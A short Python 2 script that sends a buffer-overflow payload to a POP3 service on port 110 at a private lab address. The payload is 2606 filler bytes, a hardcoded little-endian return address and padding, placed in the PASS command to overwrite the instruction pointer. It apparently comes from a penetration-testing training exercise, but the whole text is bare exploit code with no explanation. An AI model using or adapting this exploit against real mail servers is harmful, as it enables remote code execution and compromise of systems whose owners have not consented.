#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Yes I know, the address is backwards, it's how x86 interprets the address
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" +"C"*(3500-2606-4)

try:
	print "\nSending fuzzed buffer..."
	s.connect(('192.168.72.137',110))
	data = s.recv(1024)
	s.send('USER Anowar' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!,"
except:
	print "Could not connect"